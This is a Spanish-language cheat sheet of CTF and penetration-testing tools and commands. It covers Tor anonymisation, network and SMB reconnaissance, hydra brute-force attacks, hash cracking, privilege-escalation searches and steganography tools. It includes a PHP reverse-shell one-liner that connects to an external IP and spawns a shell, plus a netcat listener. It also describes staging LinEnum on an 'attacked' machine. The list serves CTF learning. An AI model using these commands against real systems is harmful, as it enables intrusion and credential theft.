# Herramientas-CTF
Herramientas útiles para afrontar CTF.

## Ocultar IP
### KALITORIFY
    Instalación: https://www.youtube.com/watch?v=bC6pL6mEnuo

Iniciar kalitorify sobre proxy tor:
```
sudo kalitorify -t
```

Verificar IP pública a la cual estamos conectados:
```
wget -qO- http://ipecho.net/plain | xargs echo
curl ip.me
curl ifconfig.me
curl https://distguard.com/ip.php
```

## Reconocimiento:
### NETDISCOVER
Ejemplos:
```
netdiscover -i <INTERFACE> //Para redes comunes en una interface de red específica (Ejemplo: eth0).
netdiscover -r 192.168.1.0/24 //Para escanear un rango dentro de una red específica (CIDR).
```
### NMAP
Análisis y descubrimiento de servicios y puertos.

Ejemplos:

Detección de servicios standard
```
nmap -sV 192.168.1.110
```
Detección de servicios con vulnerabilidades
```
nmap -sV -vv --script vuln 192.168.1.110
```
Enumeración de directorios SAMBA
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.1.110
```
### Port Knocking
```
for PORT in 1111 2222 3333 4444; do nc -vz 192.168.1.110 $PORT; done;
```
### ENUM4LINUX
Análisis y descubrimiento de recursos compartidos vía SMB
```
enum4linux -U 192.168.1.110     Usuarios.
enum4linux -S 192.168.1.110     Listas compartidas.
enum4linux -P 192.168.1.110     Política de contraseñas.
```
### Enumeración de subdominios
Web
```
https://www.nmmapper.com/sys/tools/subdomainfinder/
```
Herramientas incluidas en Kali/ParrotOS
```
sublist3r -d dominio.com
```
### WHOIS
Web
```
https://who.is/whois
```
Herramientas incluidas en Kali/ParrotOS
```
whois dominio.com
```
### GOBUSTER
Detección de directorios y archivos con la ayuda de un diccionario
```
gobuster dir -u http://192.168.1.110/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,old,bak,bin
```
### WFUZZ
Permite injectar diversas entradas en solicitudes HTTP con la ayuda de un diccionario (fuerza bruta)
```
wfuzz -c -z file,/usr/share/wordlists/FuzzList.txt http://10.10.116.130/api/page.php?parameter=FUZZ
```
### SMBCLIENT
Reconocimiento de recursos compartidos SMB
```
smbclient //192.168.1.110/shared_folder -U user_name (Conexión con credenciales)
smbclient //192.168.1.110/anonymous (Conexión a directorios anónimos)
```
### HYDRA
http-post-form
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 192.168.1.110 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed” -t 64 -V
```
ssh
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 192.168.1.110 -t 4 ssh
```
ftp
```
hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.70.92 ftp
```
### HASHCAT
Lista de modos (algoritmos) a escanear: https://hashcat.net/wiki/doku.php?id=example_hashes
```
# 0 para MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```
### WORDLISTCTL
```
git clone https://github.com/BlackArch/wordlistctl
python3 wordlistctl.py fetch male
     Download wordlists ...
gunzip file.gz
```

### MENTALIST
```
git clone https://github.com/sc0tfree/mentalist
sudo apt-get install python3-tk python3-pip
python3 setup.py install
mentalist
```
### Inyección SQL:
Codificación de URL para crear cargas útiles (payloads)
```
https://www.w3schools.com/tags/ref_urlencode.ASP
```
### Cracking
John The Ripper (https://null-byte.wonderhowto.com/forum/cracking-passwords-using-john-ripper-0181420/)

Crack de hash sin especificar tipo de codificación
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Crack de archivos zip con clave
```
zip2john archivo.zip > hash.txt
john hash.txt
```
### PYTHON3:
Ejemplos:

Inicar WebServer
```
python3 -m http.server 12345
```
### REVERSE SHELL:
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Descargar y editar (IP y Puerto)
```
https://github.com/josueitamar/php-reverse-shell/blob/master/php-reverse-shell.php
php -r ‘$sock=fsockopen(“10.8.116.182”,1234);exec(“/bin/sh -i <&3 >&3 2>&3”);’ // Para ejecución en textbox php
```
Configurar puerto escucha en netcat
```
nc -lnvp 4444
```
Estabilizar una terminal interactiva

-Python
```
export TERM=xterm
python3 -c "import pty;pty.spawn('/bin/bash')"
```
### Escalar Privilegios
https://d00mfist.gitbooks.io/ctf/content/privilege_escalation_-_linux.html
### LINENUM
Útil para escalar privilegios cuando ya se tiene un usuario comprometido satisfactoriamente
- Descargar
  - https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
- Montar en maquina destino (atacada)
  - Montar un webserver y wget, o copiar con editor de texto
- Ceder permisos de ejecución
  - chmod +x LinEnum.sh
- Ejecutar y guarda resultadoa para su respectivo análisis
  - ./LinEnum > Result.txt


---
Listar comandos permitidos para el usuario activo
```
sudo -l
```
Repositorio de binarios Unix utiles para escalar privilegios

https://gtfobins.github.io/

Buscar archivos que son propiedad de root y tienen al menos el permiso SUID: 
```
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm -4000 2> /dev/null
find / -type f -perm -4000 -exec ls -l {} \; 2> /dev/null (Verificar propiedad de archivos)
```
##Busqueda de archivos
```
FIND
find / -type f -name "*.sql" <- Con extensión específica
find /home/user/ -type f -user User_Name <- archivos propiedad de un usuario específico
find /home/user/ -type f -size 52c <- archivos con un tamaño de bytes específico
find /home/user/ -type f -newermt 2021-12-24 ! -newermt 2021-12-26 <- archivos en un rango de fechas

GREP
grep -iRl "words_to_search" /home /usr 2> /dev/null <- archivos con similitud de palabras en directorios específicos
```

## Esteganografía

### Stegoveritas
https://github.com/bannsec/stegoVeritas

### Steghide
https://github.com/StefanoDeVuono/steghide

### Stegcracker
https://github.com/Paradoxis/StegCracker

## Otras Herramientas
### Analizador de Hashes
https://www.tunnelsup.com/hash-analyzer/

https://www.onlinehashcrack.com/hash-identification.php

https://md5hashing.net/hash_type_checker

https://hashes.com/en/tools/hash_identifier

### Hash Cracker
https://crackstation.net/

### CyberChef
https://gchq.github.io/CyberChef/

### Información y ayuda sobre comandos shell
https://explainshell.com/
